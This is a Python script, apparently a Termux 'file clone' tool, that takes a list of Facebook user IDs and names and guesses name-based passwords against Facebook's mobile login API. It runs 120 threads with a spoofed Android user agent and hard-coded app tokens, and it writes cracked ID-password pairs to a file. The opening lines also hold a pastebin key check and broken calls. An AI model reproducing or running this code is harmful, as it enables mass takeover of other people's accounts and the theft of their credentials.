import sys,requests,os
uuid = str(os.getlogin())+str(os.geteuid())
key = "|".join(uuid)
link = requests.get("https://pastebin.com").text
if key in link:
   pass
else:
   print("Your key",key)
   os.system("am start xx ")
   sys.exit()
os.system("https://www.facebook.com/profile.php?id=100058912328617&mibextid=LQQJ4d ").text
import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests -y")
    import requests

li="\033[1;37m—"

cox=str(f"{li}"*37)
logo=f"""
                 █████████████████████████
███████▀▀▀░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬─█▌░░█████
████▌░░░▀┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░▄███████
██████████▄▄▄▄▄██████████
█████████████████████████

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠋⣁⣤⠶⣺⣿⣷⣤⣀⣀⣀⣀⡀⠀⠀⢀⠆
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠾⠥⠭⠟⣉⠀⠸⣏⠀⠉⠉⠉⠉⠉⠁⣀⣤⡾⠋⠀
⠀⠀⠀⠀⢀⡴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠶⠶⠶⠶⣶⡿⠟⠉⢀⡤⠒
⠀⠀⠀⡴⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠀⠀⢸⡏⠀⢀⣴⠏⠀⠀
⠀⠀⡼⡕⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠄⠀⠤⣀⠀⢣⠀⠈⠻⠶⢿⡟⠀⠀⠀
⠠⣎⠑⠂⠀⠀⠀⠀⢀⣜⣀⠔⡝⠁⠀⠀⠀⠀⠀⢢⠘⠀⠀⠀⢀⡾⠁⠀⠀⠀
⠀⠘⢻⣄⡀⢀⠀⡠⠟⢊⣉⢸⣀⣀⣀⠀⠀⠀⠀⠀⠂⠁⣠⡶⠟⢡⡇⠀⠀⠀
⠀⡀⣿⣿⣷⠩⣉⣶⣾⣿⣿⡗⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣀⣴⡟⠀⠀⠀⠀                           
⡌⠀⠈⣿⣇⢡⠛⡿⠿⠿⠛⠫⠤⠤⡀⡀⠀⠀⠀⡐⣸⣠⡭⠟⠋⠀⠀⠀⠀⠀
⢧⣄⡼⠾⢏⢌⡠⢔⣤⠀⡀⠀⠀⠀⣸⣅⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡹⠀⠀⠀⠀⠀⢀⢘⢷⣦⢀⠀⣱⠿⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣻⢦⣠⣠⣡⣠⣳⣷⠋⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⠤⣸⣸⣨⡠⠜⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;99m==============================================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m MAKROD
\033[1;32m[✓]TOOL    :\033[1;32m APK
\033[1;32m[✓]FACEBOOK:\033[1;32m ☠☠☠
\033[1;32m[✓]VERSION :\033[1;32m 11                                           
\033[1;32m[✓]STATUS  :\033[1;32m  MAKROD
\033[1;95m==============================================================="""
def logox():
    os.system('clear')
    print(logo)

def main():
    logox()
    print("  [1] FILE CLONE  | [2] EXIT TOOL")
    print(cox)
    want=input("  [✓] INPUT+>")
    if want in ["A","a","1","01"]:
        file_iclone()
    elif want in ["B","b","2","02"]:
        print(cox)
        print("  [✓] Thanks For using My tool")
        print(cox)
        sys.exit()
    else:
        print(cox)
        print("  [✓] Input right option")
        print(cox)
        time.sleep(3)
        main()

def file_iclone():
    print(cox)
    fl=input("  [✓]\033[38;5;46m File Path:")
    print(cox)
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        print("  [✓] \033[38;5;46mFile Does not found")
        print(cox)
        sys.exit()
    auto_pass(fileeee)



def auto_pass(fileeee):
    tl=str(len(fileeee))
    print("  [✓] Total id in File : "+tl)
    print(cox)
    print("  [✓] Id Save: /sdcard/MAKROD.txt")
    print(cox)
    with ThreadPool (max_workers=120) as feel:
        for data in fileeee:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append('59039200')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'12')
                    pwx.append(name1+'123')
                    pwx.append(name1+' 123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@#')
                    pwx.append(name1+'@@')
                    pwx.append(name1+'@@@')
                    pwx.append(name1+'@')
                    pwx.append(name1+'@123')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+mid_name+'12345')
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            feel.submit(file_subb,uid,pwx)
loop=0
oks=[]

def file_subb(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r  \033[38;5;46m[🇲‌🇦‌🇰‌🇷‌🇴‌🇩‌] {loop}|{str(len(oks))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [OK] {uid} | {ps}      ")
                open("/sdcard/🇲‌🇦‌🇰‌🇷‌🇴‌🇩‌-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r। [OK] {uid} | {ps}      ")
                open("/sdcard/🇲‌🇦‌🇰‌🇷‌🇴‌🇩‌-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

main()